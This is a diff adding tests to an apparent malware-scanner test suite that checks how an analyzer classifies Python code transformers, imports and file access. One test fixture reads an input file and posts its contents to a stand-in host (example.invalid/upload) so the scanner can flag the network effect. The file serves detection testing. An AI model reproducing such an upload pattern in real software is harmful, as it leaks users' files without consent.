@@ -60,6 +60,12 @@ test("web entry point imports the model manifest only on user action", () => {
 test("full browser artifact matches the checkpoint architecture", () => {
   assert.equal(FULL_MODEL_MANIFEST.metadata.name, "µMal Full");
   assert.equal(FULL_MODEL_MANIFEST.metadata.parameters, 567_746);
+  assert.equal(
+    FULL_MODEL_MANIFEST.metadata.feature_schema,
+    "malir.effect-context.v1",
+  );
+  assert.equal(FULL_MODEL_MANIFEST.metadata.training_examples, 44);
+  assert.equal(FULL_MODEL_MANIFEST.metadata.calibration, "uncalibrated-demo");
   assert.equal(FULL_MODEL_MANIFEST.config.n_layers, 2);
   assert.equal(FULL_MODEL_MANIFEST.config.n_heads, 4);
   assert.equal(FULL_MODEL_MANIFEST.config.d_model, 96);
@@ -155,6 +161,104 @@ def collect():
   );
 });
 
+
+test("effect context keeps a dual-use code transformer in review", () => {
+  const source = `import ast
+import sys
+exec("Alias = ast.AST")
+
+class Rewrite(ast.NodeTransformer):
+    pass
+
+def transform(input_path, output_path):
+    with open(input_path, "r") as source_file:
+        tree = ast.parse(source_file.read())
+    compile(tree, "<generated>", "exec")
+    with open(output_path, "w") as output_file:
+        output_file.write(ast.unparse(tree))
+
+if __name__ == "__main__":
+    transform(sys.argv[1], sys.argv[2])
+`;
+  const report = analyzeSource(source, "transformer.py");
+
+  assert.equal(report.effectSummary.primaryPurpose, "local-code-transformer");
+  assert.equal(report.effectSummary.purposeCandidates[0].confidence, "medium");
+  assert.equal(report.capabilityScore, 30);
+  assert.equal(report.riskScore, report.capabilityScore);
+  assert.equal(report.verdict, "review");
+  assert.equal(report.model.used, true);
+  assert.ok(report.model.probability < 0.2);
+  assert.ok(report.modelTokens.includes("PURPOSE:local_code_transformer"));
+});
+
+test("network effects block the local-transformer purpose shortcut", () => {
+  const source = `import ast
+import requests
+import sys
+
+def transform(input_path, output_path):
+    with open(input_path, "r") as source_file:
+        text = source_file.read()
+    tree = ast.parse(text)
+    compile(tree, "<generated>", "exec")
+    with open(output_path, "w") as output_file:
+        output_file.write(ast.unparse(tree))
+    requests.post("https://example.invalid/upload", data=text)
+
+if __name__ == "__main__":
+    transform(sys.argv[1], sys.argv[2])
+`;
+  const report = analyzeSource(source, "transformer.py");
+
+  assert.notEqual(
+    report.effectSummary.primaryPurpose,
+    "local-code-transformer",
+  );
+});
+
+test("literal imports and untyped writes do not become risky effects", () => {
+  const report = analyzeSource(
+    `first = __import__("ast")
+second = __import__("ast")
+name = "json"
+third = __import__(name)
+
+def render(handle):
+    handle.write("text")
+`,
+    "plugin.py",
+  );
+
+  assert.equal(
+    report.events.filter((event) => event.op === "IMPORT").length,
+    1,
+  );
+  assert.equal(
+    report.events.filter((event) => event.op === "DYNAMIC_IMPORT").length,
+    1,
+  );
+  assert.equal(
+    report.events.some((event) => event.op === "FILE_WRITE"),
+    false,
+  );
+});
+
+test("target normalization does not mistake tokenizer names for secrets", () => {
+  const report = analyzeSource(
+    `import tokenizer
+from pathlib import Path
+text = Path("tokenizer.py").read_text()
+`,
+    "tokenizer_runner.py",
+  );
+
+  assert.equal(
+    report.modelTokens.some((token) => token.endsWith("|T:sensitive")),
+    false,
+  );
+  assert.ok(report.modelTokens.some((token) => token.endsWith("|T:file")));
+});
 
 test("download and dynamic execution create reviewable paths", () => {
   const report = analyzeSource(DEMO_SOURCES.download, "stage.py");
